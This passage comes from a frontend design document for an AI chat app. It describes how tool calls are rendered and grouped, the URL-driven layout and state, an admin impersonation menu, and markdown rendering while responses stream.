- Human-readable descriptions (from `intent_message`) use proportional sans-serif font via `tool-name-description` class

**Expanded State**:
- Full visibility with styled background (#1a1a2e dark, #f0f0f8 light)
- Border and rounded corners
- Full-size icon (28x28px) and standard font
- Timestamp visible
- Input/Output sections with scrollable content
- Improved tool-intent contrast

**Color Scheme**:
- Tool icon: Purple accent (#a0a0ff dark, #6060a0 light)
- Primary label: When showing a human-readable description, uses proportional sans-serif font (`.tool-name-description` class); when showing a raw tool name, uses monospace font
- Secondary label: Reduced opacity text shown alongside the primary label (see `.tool-intent` in `frontend/src/components/ToolUseMessage.css`)
- Running status: Amber (#ffb400) with pulse animation
- Completed status: Green (#50c878)
- Output text: Green tint for visual distinction

**Animations**:
- Fade-in animation on new tool messages
- Pulse animation for running status
- Chevron rotation (180deg when expanded)
- Opacity transitions on hover (0.2s ease)

**Interactive Elements**:
- Header clickable to expand/collapse
- Hover effect increases opacity from 85% to 100% (collapsed)
- Smooth transitions throughout

#### 3. ToolCallGroup Component (`src/components/ToolCallGroup.tsx`)

A grouping component that collapses consecutive tool calls into a single collapsible unit, reducing visual clutter when the model makes multiple tool calls in sequence.

**Props**: Accepts an `items` array (of `ToolCallGroupItem` objects), an optional `subAgentToolCalls` map (Map keyed by parent tool ID, mapping to arrays of `SubAgentToolCallInfo`), and an optional `subAgentReturned` map (Map keyed by parent tool ID, mapping to inner Maps keyed by agent name with `SubAgentFinishedInfo` values). Both maps are passed through to `ToolUseMessage` as `childToolCalls` and `subAgentReturned` respectively, looked up by the item's `toolUse.tool_id`. See `frontend/src/components/ToolCallGroup.tsx` for the props interface.

**Features**:
- **Two-level collapsible hierarchy**: When collapsed, shows the latest tool call along with a summary label ("and N more tools"). When expanded, shows all tool calls in the group, each individually expandable via the existing `ToolUseMessage` component.
- **Grouping logic**: The `groupConsecutiveToolCalls()` utility function in `frontend/src/components/ChatPanel.tsx` scans the message list and groups adjacent `tool_use` messages (including interleaved `tool_result` messages) into arrays. Non-tool messages remain as single-item groups, preserving render order.
- **Result lookup**: The `findToolResultById()` helper in `frontend/src/components/ChatPanel.tsx` searches the full message list for a `tool_result` matching a given `tool_id`. This replaces the previous `findToolResult()` forward-search approach to support grouped rendering where tool results may not be positionally adjacent.

**Styling** (`src/components/ToolCallGroup.css`):
- Dark and light mode support
- Smooth expand/collapse animation
- Summary label styled as secondary text

#### 4. Enhanced Message Component (`src/components/Message.tsx`)

The Message component includes a `MessageContentRenderer` (in `frontend/src/components/Message.tsx`) that routes messages to the appropriate component based on `message.type`:

- `tool_use` messages are rendered via the `ToolUseMessage` component (which displays `intent_message` as the primary label and the tool name as the secondary label when a description is available)
- `tool_result` messages are rendered as simple output blocks
- `action_request` messages are rendered via the `ActionRequestMessage` component (Approve / Revise / Stop UI; see [Action Requests](action-requests.md))
- All other messages render as standard text with markdown support

#### 5. Streaming Message Handling

`WebSocketManager` consumes per-conversation events from `persistentWebSocket` and writes them into the conversation store:

**Types**: See `StructuredStreamEvent` in `frontend/src/api/types.ts` -- discriminated union for text, tool_use, and tool_result events. The `tool_use` variant includes `intent_message` for displaying as the primary label (with the tool name shown as the secondary label).

**Wire to UI mapping** (see `frontend/src/services/WebSocketManager.ts`):
- `text_delta` -- accumulates `responseParts` in the per-conversation buffer and syncs `partialResponse` so the UI shows the streaming text live
- `tool_use` -- bundles any accumulated text into a synthetic `text` message in `streamingMessages`, then appends the `tool_use` (with `intent_message`)
- `tool_result` -- appends to `streamingMessages` and links to its `tool_use` via `tool_id`
- `sub_agent_tool_use` / `sub_agent_tool_result` / `sub_agent_finished` -- routed into the conversation store's sub-agent maps, keyed by `parent_tool_id`
- `action_request` -- appends to `streamingMessages` and updates ancillary state (request-count event bus)
- `stats` -- appends to `streamingMessages` and updates `setContextUsage()` for the context indicator
- `send_message_finished` -- bundles any remaining accumulated text into `streamingMessages`, transfers `streamingMessages` into `messages`, clears the per-conversation buffer, and notifies `onStreamComplete` listeners

#### 6. ChatPanel Updates

ChatPanel now renders streaming tool use messages with consecutive tool call grouping:

**Rendering Logic**:

ChatPanel renders both tool_use and text messages from `streamingStructuredMessages`. This ensures that text appearing before tool calls (e.g., "I will write a Python script...") is preserved and displayed even after tool_use messages arrive.

Both persisted messages and streaming messages are rendered using the `groupConsecutiveToolCalls()` utility. Consecutive tool calls are grouped and rendered via the `ToolCallGroup` component instead of as individual rows.

See `frontend/src/components/ChatPanel.tsx` for implementation:
- `groupConsecutiveToolCalls()` scans the message list and groups adjacent `tool_use` messages (including interleaved `tool_result` messages) into arrays; non-tool messages remain as single-item groups
- `findToolResultById()` searches the full message list for a `tool_result` matching a given `tool_id`, replacing the previous forward-search `findToolResult()` approach
- Skips `tool_result` messages in top-level rendering (rendered inline with their corresponding `tool_use` inside each group)
- Renders tool call groups via the `ToolCallGroup` component
- Renders `action_request` messages via `MessageContentRenderer` (which delegates to `ActionRequestMessage`); see [Action Requests](action-requests.md) for the Approve / Revise / Stop UI and the wait-handle linkage that drives the collapsed state across reloads
- Renders `text` messages via `MessageContentRenderer` (text saved to structuredMessages before tool calls)
- Currently streaming text still displayed via `partialResponse` with blinking cursor
- The composer is locked on the suspended conversation while an action request (or any pending wait handle) is outstanding. `useConversation` exposes `hasPendingWait` / `pendingWaitKind` (seeded from `pending_wait_handles` on `GET /conversations/{id}` and kept fresh by `wait_handle_resolved` events), which `ChatPanel` ORs into `inputDisabled` and also uses to gate paste; the placeholder switches to "Approve, revise, or stop the pending request to continue." for `action_request`-kind waits. See [Action Requests](action-requests.md) and [Wait Handles -- Composer Sync](wait-handles.md#composer-sync)

**Helper Functions** in `frontend/src/components/ChatPanel.tsx`:
- `groupConsecutiveToolCalls()` -- Groups consecutive `tool_use` and `tool_result` messages into arrays for rendering via `ToolCallGroup`
- `findToolResultById()` -- Searches the entire message list for a `tool_result` by `tool_id` (supports grouped rendering where results may not be positionally adjacent to their tool calls)

### TypeScript Types

Types for tool use and streaming are defined in `frontend/src/api/types.ts`:

- `ToolUseMessage` -- Tool invocation message from Gemini (includes `intent_message` for displaying as the primary label; tool name shown as secondary label)
- `ToolResultMessage` -- Output from tool execution
- `ActionRequestMessage` -- Inline action-request card (`request_type`, `request_id`, `params`, `preview_fields`, `approve_label`, `wait_handle_id`, optional resolved `status` / `result` / `feedback`); see [Action Requests](action-requests.md)
- `MessageContent` -- Union type for all message content types
- `StreamEvent` -- persistent-WS event with type discriminator (text_delta, tool_use, tool_result, action_request, stats, sub_agent_*, message_appended, send_message_finished, etc.) and optional `intent_message`, `action_type`, `payload`, `seq`, `conversation_id`
- `UsageStats` -- Usage statistics (input/output/cached tokens, `new_input_tokens`, `provider`, `model`, `cache_creation_tokens`, `cache_read_tokens`, `context_tokens`, `max_context_tokens`, duration, tool calls, breakdown by call type including per-type `new_input_tokens`, `cache_creation_tokens`, `cache_read_tokens`)
- `StatsMessage` -- Stats message type for rendering usage metadata

### Backend Integration

The persistent-WS run task in `chat/realtime/socket.py:_run_send_message` drives the model loop and emits the events the frontend consumes.

The shared `make_flush_callback` from `chat/_flush_helper.py` writes structured messages to `chat_history.json` on `FLUSH_EVENT_TYPES` boundaries (`tool_use`, `tool_result`, `action_request`, `stats`) -- each append publishes a `message_appended` envelope on the conversation channel via `ChatStorage._publish_appended_to_bus`.

Transient streaming events (`text`, `sub_agent_*`, `tool_started`, `conversation_updated`) are mirrored to the same channel by `_publish_transient_event`. See [Realtime Architecture](realtime.md) and [Gemini API -- Chat Route Wiring](gemini-api.md#chat-route-wiring).

### User Experience

1. **During Streaming**:
   - Consecutive tool invocations are grouped into collapsible units via `ToolCallGroup`
   - When collapsed, the group shows the latest tool call and a summary ("and N more tools")
   - When expanded, each tool call in the group is individually expandable
   - Human-readable description (from `intent_message`) shown as the primary label; raw tool name shown as secondary label
   - If no description is available, the raw tool name is shown as the primary label
   - "running..." status with pulse animation
   - User can expand to see input JSON
   - When result arrives, status changes to "completed"
   - Output becomes visible (preview when collapsed, full when expanded)

2. **After Completion**:
   - All tool uses persisted in chat history
   - Reloading conversation shows tool uses inline with the same grouping behavior
   - Tool uses paired with their results
   - Full expand/collapse functionality preserved
   - Usage stats displayed as centered, low-contrast metadata below the response

3. **Visual Design**:
   - Consecutive tool calls grouped into collapsible units: collapsed shows latest call + "and N more tools"; expanded shows all calls individually expandable
   - Individual tool call collapsed state: Compact single-line appearance with 85% opacity (hover: 100%) for readable but unobtrusive tool messages
   - Individual tool call collapsed state: Description (or tool name) as primary label, tool name (or nothing) as secondary label, and status on one line
   - Descriptions use proportional sans-serif font; raw tool names use monospace font
   - Expanded state: Full detailed view with timestamp, input, and output sections
   - Distinct styling differentiates tool messages from text
   - Consistent with overall chat aesthetic
   - Smooth animations enhance feedback
   - Full dark/light mode support with increased contrast in both modes
   - Usage stats: Small, centered, low-contrast text. New unified display shows `NEW INPUT {n}   OUTPUT {n}   TIME {n}s   TOOLS {n}` with a hover tooltip showing provider-specific breakdown (Gemini: total/cached/new; Anthropic: non-cached/cache_creation/cache_read/new). When sub-agents are used, a second row shows `SUBAGENTS {new_input} / {output} ({N} calls)` with its own tooltip. Falls back to legacy `INPUT {n} (cached)` format for older stats messages. Token counts are formatted with locale-aware thousand separators via `formatNumber()` in `frontend/src/utils/formatters.ts`. Tooltip styles defined in `frontend/src/components/Message.css` (`.stats-tooltip-container`, `.stats-tooltip`)

### Design Decisions

**Why show the description as the primary label instead of the tool name?**

Tool names like `curl_proxy_get` or `list_workspace_files` are implementation details that do not convey meaningful context to the user. The agent-provided `intent_message` (e.g., "Fetch unread emails", "Check current time") describes what the tool call accomplishes in human-readable terms. By showing the description as the primary label and demoting the tool name to a secondary position, the collapsed tool message line reads naturally as a summary of the action being performed. When no description is available, the tool name is shown as the primary label as a fallback.

See `frontend/src/components/ToolUseMessage.tsx` (the `displayName`/`displayIntent` logic) and `frontend/src/components/ToolUseMessage.css` (`.tool-name-description` class for proportional font).

**Why 85% opacity for collapsed tool messages instead of 50%?**

The previous 50% opacity made collapsed tool messages difficult to read, especially in light mode. Tool messages carry useful context -- the description tells users what the agent is doing at a glance. The increased 85% opacity (with 100% on hover) keeps tool messages visually subordinate to the main text response while ensuring they remain legible without requiring the user to hover or expand. Boosted alpha values on text, icons, badges, and chevrons further improve contrast in both dark and light modes.

See `frontend/src/components/ToolUseMessage.css` (`.tool-use-message.collapsed` styles).

**Why group consecutive tool calls instead of rendering them individually?**

When the model makes multiple tool calls in sequence (e.g., reading several files or making multiple API requests), rendering each one as a separate row creates visual clutter and pushes the actual text response far down the viewport. Grouping consecutive tool calls into a collapsible unit keeps the conversation view compact -- collapsed groups show only the latest call with a summary count ("and N more tools"), while still allowing users to expand the group and inspect individual calls. This approach mirrors patterns in other AI chat interfaces where tool activity is summarized rather than listed verbatim.

See `frontend/src/components/ToolCallGroup.tsx` for the grouping component and `frontend/src/components/ChatPanel.tsx` (`groupConsecutiveToolCalls()`) for the grouping logic.

**Why save text to structuredMessages before tool_use?**

When a tool_use message arrives during streaming, any accumulated text in `partialResponse` needs to be preserved. Without saving it to `structuredMessages` first, the text would be lost when `partialResponse` is cleared for the next text segment. This ensures text like "I will write a Python script..." appears correctly before the subsequent tool call renders.

See `frontend/src/services/WebSocketManager.ts` (tool_use handling block) and `frontend/src/components/ChatPanel.tsx` (`renderStreamingMessages` function).

**Why render text from streamingStructuredMessages, not just partialResponse?**

Text messages saved to `structuredMessages` before tool calls would not display if only `partialResponse` was rendered. By rendering text messages from `streamingStructuredMessages`, the display matches the behavior when reloading conversation history, where all messages (text and tool_use) render in order.

## App Layout and State Management

The app layout provides the main application structure with proper component composition and state management patterns.

### Implemented Components

#### 1. App Component (`src/App.tsx`)

The main application component that orchestrates all UI components, manages global state, and defines URL-based route patterns.

**State Management**:
The App component uses `AuthContext` for session-based auth state (`isAuthenticated`, `isCheckingAuth`) and conversation management. URL params (`useParams`) are the source of truth for the active conversation and project; a `useEffect` syncs them into context state.

**Features**:
- URL-based routing via `react-router-dom` with the conversation route patterns `/`, `/chats/:conversationId`, `/projects/:projectId/:conversationId`, plus `/inbox` and the Quest Docs routes `/docs` and `/docs/:docId` (see [Quest Docs UI](#quest-docs-ui))
- Two-column layout with Sidebar and ChatPanel (or RequestsView)
- Session-based authentication via cookie (shows inline `SignInScreen` if not authenticated)
- Navigation via `useNavigate()` instead of direct state setting -- conversation selection, creation, and project navigation all update the URL
- Automatic redirect from `/chats/<id>` to `/projects/<pid>/<id>` when a conversation belongs to a project (via `handleProjectIdLoaded` callback from ChatPanel)
- Conditional rendering of RequestsView vs chat panel + file browser based on `showRequestsView` state from `NavigationContext`
- Callback-based communication between components
- Empty state handling when no conversation is selected
- Sets `document.title` to `appName` from `AppConfigContext` ("DevQuest" in dev mode, "Quest" in production)
- Loading screen heading uses `appName` for environment-aware branding

**Layout Structure**:
```
app-container (flex row, 100vh)
├── Sidebar (260px fixed width)
│   ├── sidebar-content (flex column)
│   │   ├── Brand bar (logo + app name; search icon button; requests inbox icon button with open-count badge)
│   │   └── sidebar-panels (flex: 1, slides between main and project drill-down)
│   │       ├── Projects section (always visible)
│   │       │   ├── "Create Project" button (when empty) or "+" button in header
│   │       │   └── Project entries (folder icon + chevron, click for drill-down)
│   │       │       └── Drill-down view:
│   │       │           ├── Routines section (always visible)
│   │       │           └── Conversations section
│   │       └── Conversations list
│   │           ├── "New Chat" inline button
│   │           └── Conversation entries (compact, title only)
└── main-content (flex: 1)
    ├── RequestsView (if showRequestsView)
    ├── DocsListView / DocViewer / DocsGateClosed (if a /docs route and not showRequestsView; no RightPanel)
    ├── ChatPanel + RightPanel (if activeConversationId and not showRequestsView)
    └── HomeComposer (if no conversation and not showRequestsView)
```

The admin operations menu (`AdminOpsMenu`) is not an App-level overlay; it renders inline in the sidebar's `UserInfoBar` (see below).

**Communication Patterns**:
- **URL → Context → Props**: URL params are the source of truth. A `useEffect` in `AppContent` syncs `params.conversationId` and `params.projectId` into context state, which flows down as props
  - `activeConversationId` → Sidebar (highlight active)
  - `conversationId` → ChatPanel (load conversation)

- **Child → URL**: Callback functions navigate to new URLs (wrapped in `useCallback` for stable references)
  - `onConversationSelect(id, projectId?)` ← Sidebar (user clicks) → `navigate('/chats/<id>')` or `navigate('/projects/<pid>/<id>')`
  - `onNewConversation(id, projectId?)` ← Sidebar / HomeComposer → navigates to `/chats/<id>` or `/projects/<pid>/<id>`; an empty id (Sidebar New Chat buttons) navigates to `/` to show the HomeComposer
  - `onProjectIdLoaded(convoId, projectId)` ← ChatPanel → redirects `/chats/<id>` to `/projects/<pid>/<id>` when conversation belongs to a project

- **Direct Event Subscriptions**: Components subscribe to realtime events instead of relying on context-level state changes
  - Sidebar subscribes to `webSocketManager.onStreamComplete` for conversation list refresh
  - FileBrowser subscribes to `persistentWebSocket.onGlobalEvent` filtered for `file_list_changed` (per-user global) and silent-refreshes after a 200ms debounce
  - ProjectTables subscribes to `webSocketManager.onStreamComplete` for the project DB table list refresh

#### 2. Direct WebSocket Event Subscriptions

Components that need to refresh after streaming or workspace mutations subscribe directly to realtime events via `useEffect`, rather than relying on context-level state changes. This avoids unnecessary re-renders of unrelated context consumers.

- **Sidebar** subscribes to `webSocketManager.onStreamComplete` and calls `silentLoadConversations()`, which uses stale-while-revalidate (keeps existing list visible while fetching) to avoid a "Loading..." flash
- **FileBrowser** subscribes to `persistentWebSocket.onGlobalEvent` and filters for `file_list_changed` envelopes that match the active conversation (or its project, for project-scoped writes), debouncing 200ms before calling `silentRefresh()`. The trigger is the workspace-mutating tool / REST event itself, not a streaming-lifecycle boundary, so the file list refreshes mid-turn after each successful write
- **ProjectTables** subscribes to `webSocketManager.onStreamComplete` and calls `loadTables(true)` for a silent table list refresh at end-of-turn

See `frontend/src/services/WebSocketManager.ts` for the `onStreamComplete` callback API and `frontend/src/services/PersistentWebSocket.ts` for `onGlobalEvent` (used for `file_list_changed` and other per-user globals).

#### 3. App Layout Styling (`src/App.css`)

Flexbox layout (see `frontend/src/App.css`):
- Sidebar: Fixed 260px width (defined in `frontend/src/components/Sidebar.css`)
- Main content: Flexes to fill remaining space (`flex: 1`)
- Full viewport height (100vh), full width
- No max-width constraints (spans full browser window)

#### 4. AdminOpsMenu Component (`src/components/AdminOpsMenu.tsx`)

An admin operations menu visible to admin users and during impersonation sessions. Reads `isAdmin`, `isImpersonating`, `userEmail`, and `impersonatorEmail` from `AuthContext`.

**Behavior**:
- Renders a wrench icon button in one of two variants: the default inline variant (`inline` prop) sits in the sidebar's `UserInfoBar` next to the settings gear, so it never overlaps the composer; the floating variant (a small button fixed to the bottom-right corner of the viewport) is used only on the System Reports page, which has no sidebar
- Clicking the button opens an upward dropdown menu with admin operation items (the inline dropdown overlays the sidebar content)
- Supports "Shut down server" with a two-step confirmation flow (click once to see confirmation, click again to execute). Calls `triggerAdminShutdown()` in `frontend/src/api/client.ts` which sends `POST /app/api/admin/shutdown`
- Supports user impersonation: shows a user picker populated via `GET /app/api/admin/users`, starts impersonation via `POST /app/api/admin/impersonate`
- During impersonation: button turns amber/orange, menu shows "Viewing as {email}" info and an "End impersonation" button that calls `POST /app/api/admin/stop-impersonation` and navigates to `/` to avoid stale conversation URLs
- Admin-only items (Impersonate, Shut down) are hidden during impersonation; only the impersonation info and end button are shown
- Clicking outside the menu closes it

**Key files**:
- Component: `frontend/src/components/AdminOpsMenu.tsx`
- Styles: `frontend/src/components/AdminOpsMenu.css` (dark/light theme support, amber impersonation state)
- API functions: `triggerAdminShutdown()`, `fetchAdminUsers()`, `impersonateUser()`, `stopImpersonation()` in `frontend/src/api/client.ts`
- Endpoint configs: `adminShutdown()`, `adminUsers()`, `adminImpersonate()`, `adminStopImpersonation()` in `frontend/src/api/config.ts`

See [Admin Impersonation](admin-impersonation.md) for the full impersonation flow.

#### 5. Global Styles (`src/index.css`)

Defines shared CSS variables and minimal body resets:

- `:root` defines `--font-mono` CSS variable (JetBrains Mono stack) used by all components that render monospace text (code blocks, tool names, stack traces, settings panels). The font is loaded via Google Fonts in `frontend/index.html`
- Body reset: `margin: 0`, `min-width: 320px`, `min-height: 100vh` (centering properties removed to let App.tsx control layout)

### User Flow: Complete Journey

#### 1. First-Time User
```
1. User visits / (or /chats/<id> or /projects/<pid>/<id> via deep link)
2. React Router matches URL to route pattern
3. AppConfigContext fetches GET /app/api/config → derives appName ("DevQuest" or "Quest")
4. AuthContext calls checkSession() → GET /app/api/me with cookie
5. App.tsx sets document.title to appName
6. If session valid → isAuthenticated = true → main app shown
7. If session fails → show inline SignInScreen component (heading uses appName)
8. If deep link → useEffect syncs URL params into context → conversation loads automatically
```

#### 2. Returning User
```
User opens app (or navigates to a deep link URL)
       ↓
React Router matches URL to route pattern (/, /chats/:id, /projects/:pid/:id)
       ↓
checkSession() validates session cookie
       ↓
isAuthenticated = true
       ↓
useEffect syncs URL params → context (activeConversationId, activeProjectId)
       ↓
App.tsx renders main layout (Sidebar + main-content)
       ↓
Sidebar fetches projects and conversations (cookie auth)
       ↓
If URL has conversation ID → ChatPanel mounts with that conversation
If URL has project ID → Sidebar auto-drills into that project
If no params → empty state shown
       ↓
User clicks "New Chat" (brand bar icon / Conversations header "+")
       ↓
onNewConversation('', projectId | null) callback → navigate('/')  (drill state kept)
       ↓
HomeComposer shown -- NO conversation exists yet
       ↓
User types the first message and sends
       ↓
HomeComposer creates the conversation via API, stashes pendingFirstMessage
       ↓
onNewConversation(id) callback → navigate('/chats/<id>')
       ↓
ChatPanel mounts, auto-sends the stashed first message
```

#### 3. Sending First Message
```
User types message in ChatPanel
       ↓
User presses Enter
       ↓
Message sent via WebSocket
       ↓
Response streams back
       ↓
WebSocketManager fires onStreamComplete event
       ↓
Sidebar (subscribed directly) calls silentLoadConversations()
       ↓
Conversations fetched in background (existing list stays visible)
       ↓
Updated "last message" timestamp shown
```

#### 4. Switching Conversations
```
User clicks different conversation in Sidebar
       ↓
onConversationSelect(newId, projectId?) callback fired
       ↓
navigate('/chats/<newId>') or navigate('/projects/<pid>/<newId>')
       ↓
URL change → useEffect syncs params → activeConversationId updated
       ↓
ChatPanel re-mounts with new conversationId
       ↓
ChatPanel loads conversation history
       ↓
Messages displayed
       ↓
(Browser back/forward buttons now navigate between conversations)
```

#### 5. Project Drill-Down Navigation
```
User clicks a project in the sidebar
       ↓
handleProjectDrillDown(projectId) saves activeConversationId to previousTopLevelConversationId ref
       ↓
Slide-left animation reveals project drill-down view
       ↓
loadProjectConversations(projectId) fetches project conversations (returns Promise<Conversation[]>)
       ↓
Project has conversations? ──NO──→ onConversationSelect('', null) → empty state
    │
   YES
    ↓
onConversationSelect(latestConversation.id, projectId) → auto-selects latest conversation
       ↓
ChatPanel loads the project conversation
```

```
User clicks back button in drill-down view
       ↓
handleDrillDownBack() reads savedId from previousTopLevelConversationId ref
       ↓
previousTopLevelConversationId ref cleared to null
       ↓
onConversationSelect(savedId ?? '', null) → restores previous conversation or empty state
       ↓
Slide-right animation returns to main sidebar view
```

### Component Communication Architecture

```
App.tsx (State Container, wrapped in AppProviders, with React Router)
    │
    ├── URL (source of truth for active conversation and project)
    │   ├── /                              → no conversation selected
    │   ├── /chats/:conversationId         → standalone conversation
    │   └── /projects/:projectId/:conversationId → project conversation
    │
    ├── useEffect syncs URL params → context (activeConversationId, activeProjectId)
    │
    ├── appName (from AppConfigContext, fetched via GET /app/api/config)
    │   └── Sets document.title and loading screen heading
    │
    ├── isAuthenticated (from AuthContext, session cookie)
    │   └── If false → show inline SignInScreen (heading uses appName)
    │
    ├── activeConversationId (from context, synced from URL)
    │   ├──→ Sidebar (highlight active conversation)
    │   └──→ ChatPanel (which conversation to display)
    │
    ├── onConversationSelect ← Sidebar (user clicks conversation or project conversation)
    │   └── navigate() to appropriate URL → triggers useEffect → updates context
    │
    ├── onNewConversation ← Sidebar (empty id → home composer) / HomeComposer (first send created the chat)
    │   └── navigate() to appropriate URL → triggers useEffect → updates context
    │
    ├── onProjectIdLoaded ← ChatPanel (conversation belongs to a project)
    │   └── navigate(replace: true) from /chats/<id> → /projects/<pid>/<id>
    │
    └── Realtime event subscriptions (not via context)
        ├── WebSocketManager.onStreamComplete → Sidebar (silentLoadConversations)
        ├── WebSocketManager.onStreamComplete → ProjectTables (loadTables(true))
        └── persistentWebSocket.onGlobalEvent ('file_list_changed') → FileBrowser (silentRefresh, 200ms debounce)
```

### State Management Patterns

#### 1. URL-Driven State
Active conversation and project state is derived from the URL via `useParams()`. A `useEffect` in `AppContent` syncs URL params into `NavigationContext` / `ProjectsContext`, which flows down as props. Navigation uses `useNavigate()` from `react-router-dom` instead of direct state setting. See `frontend/src/App.tsx` for the sync effect and callback handlers.

#### 2. Callback Props
Children communicate changes via callbacks that navigate to new URLs:
See `frontend/src/App.tsx` for `handleConversationSelect` and `handleNewConversation` (both wrapped in `useCallback`).

#### 3. useCallback Optimization
Callbacks wrapped in useCallback to prevent unnecessary re-renders (see `frontend/src/App.tsx` for examples of `useCallback`-stabilized handlers passed to Sidebar).

#### 4. Controlled Components
Form inputs controlled by React state (e.g., message input in ChatPanel):
```typescript
const [inputValue, setInputValue] = useState('');

<textarea
  value={inputValue}
  onChange={(e) => setInputValue(e.target.value)}
/>
```

### Layout CSS Architecture

#### Flexbox-Based Two-Column Layout
```css
.app-container {
  display: flex;
  flex-direction: row;  /* Side-by-side columns */
  height: 100vh;         /* Full viewport height */
}

/* Column 1: Sidebar (fixed width) */
.sidebar {
  width: 260px;
  flex-shrink: 0;  /* Don't shrink */
}

/* Column 2: Main content (flexible) */
.main-content {
  flex: 1;         /* Take remaining space */
}
```

#### Full-Window Layout Strategy
1. **Remove body centering** (index.css)
2. **Remove root max-width** (App.css)
3. **Use flex: 1 for expanding areas** (App.css)
4. **Set height: 100vh on containers** (App.css)

#### Responsive Considerations
Current implementation is desktop-first:
- Fixed sidebar width (260px)
- No mobile breakpoints yet
- Horizontal scrolling on small screens

Future improvements:
- Collapsible sidebar on mobile
- Hamburger menu for small screens
- Responsive sidebar width

### Component Hierarchy

```
BrowserRouter (from react-router-dom, wraps entire app in main.tsx)
└── AppProviders (AppConfigContext: GET /app/api/config; AuthContext: session auth via checkSession(); plus the appearance, navigation, projects, guides, models, skills and file-browser contexts)
    └── Routes
        ├── Route path="/" → AppContent
        ├── Route path="/chats/:conversationId" → AppContent
        └── Route path="/projects/:projectId/:conversationId" → AppContent
            └── AppContent (useParams + useNavigate, syncs URL → context)
                ├── isCheckingAuth? → Show "{appName} Loading..."
                ├── !isAuthenticated? → Show SignInScreen (heading uses appName)
                │
                └── Main Layout (isAuthenticated)
                    ├── Sidebar
                    │   ├── useEffect (subscribe to webSocketManager.onStreamComplete → silentLoadConversations)
                    │   ├── useEffect (auto-drill-down when activeProjectId set from URL)
                    │   ├── Requests section (sticky, above sidebar-panels)
                    │   ├── Search section (sticky, above sidebar-panels)
                    │   ├── sidebar-panels (slides between main and drill-down)
                    │   │   ├── Projects section (always visible)
                    │   │   │   └── Project entries (folder icon + chevron → drill-down)
                    │   │   │       └── Drill-down: Routines section (always visible) + Conversations section
                    │   │   └── Conversations list
                    │   │       ├── "New Chat" inline button
                    │   │       └── Map → Conversation items (compact, title only)
                    │   ├── NewRoutineModal (portal, opened from routines section)
                    │   └── RoutineSettingsModal (portal, 720px, left nav with Prompt/Schedule/Delete sections)
                    │
                    └── Main Content
                        ├── ChatPanel (conditional, receives onProjectIdLoaded callback)
                        │   ├── useEffect (load history)
                        │   ├── useConversation hook → WebSocketManager
                        │   ├── Messages list
                        │   │   └── Map → Message components
                        │   └── Input area
                        │
                        └── HomeComposer (conditional, no conversation selected)
                            ├── Greeting ("What can I help you with, <first name>?")
                            └── Shared <Composer> (draft-keyed)
```

### Implementation Notes

**Why direct WebSocket subscriptions instead of context-level triggers?**
Previously, the monolithic `ConversationContext` held `refreshTrigger` and `fileBrowserRefreshTrigger` state variables that were incremented on stream completion, causing every context consumer (Sidebar, ChatPanel, FileBrowser, etc.) to re-render. This caused visible UI flicker when LLM responses finished streaming.

The current approach has each component subscribe directly to its own realtime event in a `useEffect`. Sidebar uses `webSocketManager.onStreamComplete` plus `persistentWebSocket.onGlobalEvent` for `conversation_list_changed`; FileBrowser uses `persistentWebSocket.onGlobalEvent` for `file_list_changed`; ProjectTables uses `webSocketManager.onStreamComplete`. Only the subscribing component re-renders, avoiding unnecessary re-renders of unrelated components. Sidebar uses `silentLoadConversations()` with stale-while-revalidate to keep the existing conversation list visible during refresh.

**Why URL-driven state instead of local state?**
The active conversation and project are now derived from URL params via `react-router-dom`. This enables deep linking, page refresh, and browser back/forward navigation. The URL is the source of truth; a `useEffect` syncs params into `NavigationContext` / `ProjectsContext` so that components reading from context stay in sync.

### Testing Considerations

**Unit Tests for App.tsx**:
```typescript
// Test auth redirect
// Mock checkSession to return null
expect(window.location.href).toBe('/auth/')

// Test authenticated state
// Mock checkSession to return { email: 'test@test.com', name: 'Test' }
expect(render(<App />)).not.toContain('Loading')

// Test conversation selection
const { getByText } = render(<App />)
fireEvent.click(getByText('Conversation 1'))
expect(ChatPanel).toHaveBeenCalledWith({ conversationId: 'conv-1' })
```

**Integration Tests**:
- Test full user flow from session auth to message send
- Verify sidebar updates after message sent
- Test conversation switching
- Test empty states
- Test inline SignInScreen when session is invalid

### Performance Considerations

**Re-Render Optimization**:
- useCallback for stable callback references
- Conditional rendering to avoid mounting unused components
- Direct WebSocket event subscriptions (instead of context-level triggers) prevent unnecessary re-renders of unrelated components
- Stale-while-revalidate pattern in Sidebar and FileBrowser prevents "Loading..." flash during refresh

**Layout Performance**:
- CSS Flexbox (hardware accelerated)
- No JavaScript-based layout calculations
- Minimal DOM nesting

### Future Enhancements

Potential future improvements:

1. **Sidebar Improvements**
   - Collapsible sidebar
   - Resize handle
   - Pinned conversations

### Not Yet Implemented

The following are planned for future development:

- Copy message content button
- Message regeneration
- Message editing
- Settings panel
- Conversation deletion
- Conversation renaming
- File attachments
- Image rendering in messages (markdown images work, but not attachments)
- Responsive mobile layout

## Streaming UI Enhancements

The streaming UI provides improved visual feedback during response generation and backend conversation memory.

### Implemented Features

#### 1. Markdown Rendering for Streaming Messages

Streaming messages now render with the same markdown support as completed messages:

**Implementation in ChatPanel.tsx**:

The streaming `ReactMarkdown` render in `frontend/src/components/ChatPanel.tsx` imports and uses the shared `markdownComponents` object from `frontend/src/components/Message.tsx`, along with the same remark/rehype plugins: `remarkGfm`, `remarkBreaks`, and `rehypeHighlight`.

**Features**:
- Full markdown rendering during streaming (headings, lists, links, code blocks)
- Syntax highlighting updates in real-time as code appears
- Tables and GFM features render as they stream, including the table copy hover widget
- Links open in new browser tabs (via shared `markdownComponents`)
- Consistent newline rendering via `remark-breaks` (matches final message display)
- Identical rendering to completed messages for consistency

**Technical Details**:
- Uses same `ReactMarkdown` configuration as Message component via the shared `markdownComponents` export (custom element renderers for links and tables)
- Plugins: `remark-gfm` for GitHub Flavored Markdown, `remark-breaks` for newline preservation, `rehype-highlight` for syntax highlighting
- Streaming CSS uses `white-space: normal` on `.message.streaming .message-content` (newline rendering is handled by `remark-breaks` `<br>` elements, not CSS)
- Performance: Markdown parsing happens on each chunk, but React optimizes re-renders
- Cursor indicator positioned at end of rendered markdown

#### 2. Pre-Stream Typing Indicator

Added visual feedback before streaming begins:

**Implementation**:
```typescript
{isStreaming && !partialResponse && (
  <div className="typing-placeholder">
    <span className="typing-dots">
      <span></span>
      <span></span>
      <span></span>
    </span>
    Generating response...
  </div>
)}
```

**Features**:
- Displays "Generating response..." with animated dots
- Shows immediately when streaming state begins
- Disappears once first chunk arrives
- Provides feedback during Docker container startup delay

**CSS Animation**:
```css
.typing-placeholder {
  padding: 1rem;
  color: rgba(255, 255, 255, 0.6);
  font-style: italic;
  display: flex;
  align-items: center;
